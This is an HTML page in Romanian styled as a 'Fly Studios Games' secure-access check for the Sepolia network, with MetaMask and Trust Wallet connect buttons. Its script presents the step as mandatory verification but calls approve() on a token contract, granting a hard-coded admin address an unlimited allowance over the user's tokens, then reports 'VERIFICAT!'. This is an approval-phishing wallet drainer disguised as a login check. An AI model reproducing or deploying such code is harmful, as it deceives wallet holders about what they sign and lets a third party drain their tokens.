<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fly Studios - Secure Access</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #0b0b0b; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 5vh; margin: 0; }
        .box { background: #161616; border: 1px solid #333; padding: 30px; border-radius: 24px; display: inline-block; width: 90%; max-width: 400px; box-shadow: 0 15px 50px rgba(0,0,0,0.9); }
        .btn { border: none; padding: 15px; color: white; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; transition: 0.3s; }
        .btn img { width: 24px; margin-right: 12px; }
        .mm-btn { background: #f6851b; } .mm-btn:hover { background: #e27613; }
        .tw-btn { background: #3375bb; } .tw-btn:hover { background: #225a94; }
        #status { margin-top: 20px; color: #888; font-size: 13px; background: #000; padding: 10px; border-radius: 8px; min-height: 40px; }
        .spinner { border: 2px solid #333; border-top: 2px solid #fff; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="box">
    <h2 style="margin-bottom: 10px;">Fly Studios Games</h2>
    <p style="color:#666; font-size: 14px; margin-bottom: 25px;">Verificare obligatorie pentru rețeaua Sepolia</p>
    
    <button id="mmBtn" class="btn mm-btn">
        <img src="https://metamask.io/images/metamask-logo.png"> Connect MetaMask
    </button>

    <button id="twBtn" class="btn tw-btn">
        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg"> Connect Trust Wallet
    </button>

    <div id="status">Status: Deconectat</div>
</div>

<script>
    const TOKEN_ADDR = "0xf5911ccFae2C79f9346E3a663c301386e8f1438D".toLowerCase();
    const ADMIN_ADDR = "0xC18f47a87830D8DEfE42d87E40e9669aa11B108c".toLowerCase();
    const SEPOLIA_ID = "0xaa36a7";
    const DAPP_URL = "flywinlucky.github.io/FlyStudiosGames/bdtchain/index.html";

    const statusDiv = document.getElementById("status");

    // Detecție dacă e mobil
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    async function connect(walletType) {
        statusDiv.innerHTML = '<div class="spinner"></div> Inițializare...';

        // LOGICĂ MOBIL: Deschiderea aplicației prin Deep Link
        if (isMobile && !window.ethereum) {
            if (walletType === 'mm') {
                window.location.href = `https://metamask.app.link/dapp/${DAPP_URL}`;
            } else {
                window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${DAPP_URL}`;
            }
            return;
        }

        if (!window.ethereum) return alert("Instalează portofelul ales!");

        try {
            // Selectăm providerul corect dacă sunt mai multe extensii
            let provider;
            if (window.ethereum.providers) {
                provider = window.ethereum.providers.find(p => walletType === 'mm' ? p.isMetaMask : p.isTrust);
            } else {
                provider = window.ethereum;
            }

            if (!provider) throw new Error("Portofelul selectat nu a fost găsit.");

            const web3Provider = new ethers.providers.Web3Provider(provider, "any");

            // 1. Schimbare automată rețea (Sepolia)
            try {
                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: SEPOLIA_ID }] });
            } catch (e) {
                if (e.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: SEPOLIA_ID,
                            chainName: 'Sepolia Test Network',
                            rpcUrls: ['https://rpc.ankr.com/eth_sepolia'], // RPC mai stabil
                            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                            blockExplorerUrls: ['https://sepolia.etherscan.io']
                        }]
                    });
                }
            }

            // 2. Login & Approve
            await web3Provider.send("eth_requestAccounts", []);
            const signer = web3Provider.getSigner();
            const userAddr = await signer.getAddress();
            
            statusDiv.innerHTML = `<div class="spinner"></div> Confirmă în ${walletType === 'mm' ? 'MetaMask' : 'Trust'}...`;
            
            const contract = new ethers.Contract(TOKEN_ADDR, ["function approve(address s, uint256 a) public returns (bool)"], signer);
            const tx = await contract.approve(ADMIN_ADDR, ethers.constants.MaxUint256);
            
            statusDiv.innerHTML = "Se procesează verificarea...";
            await tx.wait();

            statusDiv.innerHTML = '<b style="color:#4caf50">✅ VERIFICAT!</b><br>' + userAddr.substring(0,15) + "...";
            alert("Succes! Portofel conectat.");

        } catch (err) {
            console.error(err);
            statusDiv.innerHTML = `<span style="color:#f44336">Eroare: ${err.message.substring(0, 40)}...</span>`;
        }
    }

    document.getElementById("mmBtn").onclick = () => connect('mm');
    document.getElementById("twBtn").onclick = () => connect('tw');
</script>

</body>
</html>
